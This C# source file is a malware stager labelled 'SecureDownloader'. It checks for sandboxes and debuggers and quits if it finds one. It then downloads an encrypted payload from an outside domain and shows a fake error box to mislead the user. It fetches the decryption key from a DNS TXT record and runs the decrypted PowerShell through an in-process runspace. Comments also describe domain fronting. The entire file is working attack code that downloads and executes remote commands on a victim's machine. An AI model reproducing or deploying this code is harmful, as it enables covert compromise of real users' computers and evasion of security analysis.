using System;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Net;
using Microsoft.Win32;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace SecureDownloader {
    class SandboxCheck {
        private static bool checkTimeZone() {
            if (TimeZone.CurrentTimeZone.StandardName == "Coordinated Universal Time") {
                return false;
            }
            else {
                return true;
            }
        }

        private static bool checkProcessorCount() {
            return System.Environment.ProcessorCount > 1;
        }

        private static bool checkDebugger() {
            return !System.Diagnostics.Debugger.IsAttached;
        }

        private static bool checkOfficeInstall() {
            List<string> EvidenceOfOffice = new List<string>();
            string[] FilePaths = {  @"C:\Program Files\Microsoft Office\Office12\excel.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office12\excel.exe",
                                    @"C:\Program Files\Microsoft Office\Office14\excel.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office14\excel.exe",
                                    @"C:\Program Files\Microsoft Office\Office15\excel.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office15\excel.exe",
                                    @"C:\Program Files\Microsoft Office\Office16\excel.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office16\excel.exe",
                                    @"C:\Program Files\Microsoft Office\Office12\winword.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office12\winword.exe",
                                    @"C:\Program Files\Microsoft Office\Office14\winword.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office14\winword.exe",
                                    @"C:\Program Files\Microsoft Office\Office15\winword.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office15\winword.exe",
                                    @"C:\Program Files\Microsoft Office\Office16\winword.exe",
                                    @"C:\Program Files (x86)\Microsoft Office\Office16\winword.exe"};
            foreach (string FilePath in FilePaths) {
                if (File.Exists(FilePath)) {
                    EvidenceOfOffice.Add(FilePath);
                }
            }

            return EvidenceOfOffice.Count >= 1;
        }

        public static void izSafe() {
            if (!checkTimeZone()) {
                Environment.Exit(0);
            }

            if (!checkProcessorCount()) {
                Environment.Exit(0);
            }

            if (!checkDebugger()) {
                Environment.Exit(0);
            }

            if (!checkOfficeInstall()) {
                Environment.Exit(0);
            }

            return;
        }
    }

    //SharpPick
    class FunStuff {
        public static string DoFunStuff(string cmd) {
            //Init stuff
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            //Add commands
            pipeline.Commands.AddScript(cmd);

            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results) {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }
    }

    class HelperFunctions {
        // stolen from https://stackoverflow.com/questions/273452/using-aes-encryption-in-c-sharp
        public static string decrypt(byte[] cipherText, byte[] Key, byte[] IV) {
            // Check arguments. 
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");

            // Declare the string used to hold 
            // the decrypted text. 
            string plaintext = null;

            try
            {
                // Create an RijndaelManaged object 
                // with the specified key and IV. 
                using (RijndaelManaged rijAlg = new RijndaelManaged())
                {
                    rijAlg.Key = Key;
                    rijAlg.IV = IV;

                    // Create a decrytor to perform the stream transform.
                    ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);

                    // Create the streams used for decryption. 
                    using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                    {
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                            {

                                // Read the decrypted bytes from the decrypting stream 
                                // and place them in a string.
                                plaintext = srDecrypt.ReadToEnd();
                            }
                        }
                    }
                }
                return plaintext;
            }
            catch { return ""; }
        }

        // stolen fron http://www.robertsindall.co.uk/blog/blog/2011/05/09/getting-dns-txt-record-using-c-sharp/
        public static IList<string> getTXTrecords(string domain) {
            IList<string> txtRecords = new List<string>();
            string output;
            string pattern = string.Format(@"{0}\s*text =\s*""([\w\-\=]*)""", domain);
            var getKey = new ProcessStartInfo("nslookup");
            getKey.Arguments = string.Format("-type=TXT {0}", domain);
            getKey.RedirectStandardOutput = true;
            getKey.UseShellExecute = false;
            getKey.WindowStyle = ProcessWindowStyle.Hidden;
            using (var nslookupProcess = Process.Start(getKey)) {
                output = nslookupProcess.StandardOutput.ReadToEnd();
            }

            var matches = Regex.Matches(output, pattern, RegexOptions.IgnoreCase);
            foreach (Match match in matches) {
                if (match.Success)
                    txtRecords.Add(match.Groups[1].Value);
            }

            return txtRecords;
        }

        // stolen from https://stackoverflow.com/questions/27108264/c-sharp-how-to-properly-make-a-http-web-get-request
        public static string HttpGet(string URI) {
            WebClient client = new WebClient();

            //proxy aware
            client.UseDefaultCredentials = true;
            client.Proxy = WebRequest.GetSystemWebProxy();
            client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

            Stream data = client.OpenRead(URI);
            StreamReader reader = new StreamReader(data);
            string s = reader.ReadToEnd();
            data.Close();
            reader.Close();

            return s;
        }

        public static bool CompareHashes(string payload, string origHash)
        {
            byte[] bytes = Encoding.Unicode.GetBytes(payload);
            System.Security.Cryptography.SHA256Managed sha256 = new System.Security.Cryptography.SHA256Managed();
            byte[] hashBytes = sha256.ComputeHash(bytes);
            string hash = String.Empty;
            foreach (byte x in hashBytes)
            {
                hash += String.Format("{0:x2}", x);
            }

            return origHash == hash;
        }
    }

    class Program {
        // PS> $text = <paste payload here (before encryption)>
        // PS> $algo = [Security.Cryptography.HashAlgorithm]::Create("SHA256")
        // PS> $result = [System.BitConverter]::ToString($algo.ComputeHash([System.Text.Encoding]::Unicode.GetBytes($text))).ToLower() -replace "-",""
        const string origHash = "<GENERATE HASH WITH ABOVE>";
        const int SLEEPTIME = 30000;
        static void Main() {
            SandboxCheck.izSafe();

            //string data;
            //var version = Environment.Version;
            //if (version.Major >= 4) //domain fronting requires .NET 4.0 or higher
            //{
            //    data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/appdata");
            //}
            //else //cant domain front, fetch alternate payload
            //{
            //    data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/data-nf");
            //}
            //Environment.Exit(0);
            string data = HelperFunctions.HttpGet("https://secured.concordiafunds.com/data-nf2");
            byte[] iv = Convert.FromBase64String(data.Split(':')[0]);
            byte[] encryptedCmd = Convert.FromBase64String(data.Split(':')[1]);

            MessageBox.Show("Please contact the sender of the document for authorization.", "An error occured", MessageBoxButtons.OK, MessageBoxIcon.Error);

            int retries = 300;
            string decodedCmd = String.Empty;
            do
            {
                byte[] key = Encoding.ASCII.GetBytes(HelperFunctions.getTXTrecords("fda7hk2.concordiafunds.com")[0]);
                string cmd = HelperFunctions.decrypt(encryptedCmd, key, iv);

                if (cmd != "")
                {
                    decodedCmd = Encoding.Unicode.GetString(Convert.FromBase64String(cmd));
                    if(HelperFunctions.CompareHashes(decodedCmd, origHash))
                    {
                        break;
                    }
                }
                System.Threading.Thread.Sleep(SLEEPTIME);
                retries--;
            } while (retries > 0);

            FunStuff.DoFunStuff(decodedCmd);
        }
    }
}